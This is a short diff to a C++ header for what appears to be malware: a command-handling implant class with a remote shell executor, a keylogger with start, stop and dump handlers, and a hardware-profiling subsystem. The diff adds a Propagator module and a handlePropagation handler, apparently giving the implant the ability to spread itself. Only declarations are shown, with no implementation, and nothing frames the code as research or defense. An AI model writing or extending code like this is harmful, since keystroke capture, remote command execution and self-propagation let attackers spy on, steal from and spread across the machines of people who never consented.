@@ -5,6 +5,7 @@
 #include "ProcessProfiler.hpp"
 #include "ShellExecutor.hpp"
 #include "KeyLogger.hpp"
+#include "Propagator.hpp"
 #include <string>
 #include <vector>
 #include <atomic>
@@ -55,6 +56,7 @@ private:
     void handleKeylogStart();
     void handleKeylogStop();
     void handleKeylogDump();
+    void handlePropagation(Packet&& packet);
 
     // System Profiler (Gourmandise Subsystem)
     std::string getHardwareUUID();
@@ -73,6 +75,7 @@ private:
     ProcessProfiler m_profiler;
     ShellExecutor   m_shell;
     KeyLogger       m_keylogger;
+    Propagator      m_propagator;
 
     // Keylogger jitter thread
     std::thread              m_keylog_jitter_thread;
